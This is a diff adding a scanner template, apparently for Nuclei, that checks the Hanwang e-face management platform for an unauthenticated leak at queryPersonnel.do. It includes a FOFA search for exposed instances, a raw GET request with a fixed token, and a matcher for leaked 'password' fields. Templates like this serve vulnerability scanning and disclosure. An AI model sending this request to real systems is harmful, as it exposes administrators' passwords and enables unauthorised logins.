@@ -1,0 +1,23 @@
+id: HanWang-e-LianTongZongHeGuanLiPingTai-queryPersonnel_do-Information-Disclosure
+
+info:
+  name: 汉王e脸通综合管理平台 queryPersonnel.do 信息泄露
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: icon_hash="1380907357"
+    汉王e脸通综合管理平台 queryPersonnel.do 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |
+        GET /manage/personnel/queryPersonnel.do?page=1&pagesize=10&recoToken=ZuZBOrvLG8M HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers:
+      - type: dsl
+        name: 信息泄露
+        dsl:
+          - "status_code == 200 && contains (body,'password','numRows')"
